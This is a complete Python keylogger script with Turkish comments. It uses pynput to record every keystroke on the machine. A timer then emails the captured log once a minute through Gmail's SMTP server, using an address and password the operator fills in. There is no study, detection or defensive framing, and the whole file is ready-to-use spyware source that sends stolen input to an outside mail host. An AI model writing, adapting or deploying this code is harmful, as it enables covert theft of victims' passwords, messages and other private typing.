# -*- coding: cp1254 -*-
# -*- coding: utf-8 -*-



import pynput.keyboard
import threading,smtplib



emailim = ""          #Bu kisima kendi email adresinizi yaziniz.
Parolam = ""          #Bu kisima da parolanizi eklemelisiniz.

log = ""


def process_key_press(key):
    global log
    try:
        log = str(log) + str(key.char)
    except AttributeError:
        if key == key.space:
            log = str(log) + " "
        elif key == key.backspace:
            log = str(log) + "/"
        elif key == key.alt_l:
            pass
        elif key == key.tab:
            pass
        elif key == key.ctrl_l:
            pass
        elif key == key.alt_gr:
            pass
        elif key == key.shift_r:
            pass
        elif key == key.up:
            pass
        elif key == key.right:
            pass
        elif key == key.down:
            pass
        elif key == key.enter:
            pass
        elif key == key.caps_lock:
            pass
        else:
            log = str(log) + " " + str(key).decode("utf-8") + " "
    except UnicodeEncodeError:
        log = str(log) + str(key).encode("utf-8")


def report():
    global log
    if len(log) != 0:
        gonder(log)
    else:
        pass
    log = ""
    timer = threading.Timer(60, report)
    timer.start()


def gonder(log):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(emailim, Parolam)
    server.sendmail(emailim, emailim, log.encode("utf-8"))
    server.quit()


keyboad_listen = pynput.keyboard.Listener(on_press=process_key_press)

with keyboad_listen:
    report()
    keyboad_listen.join()
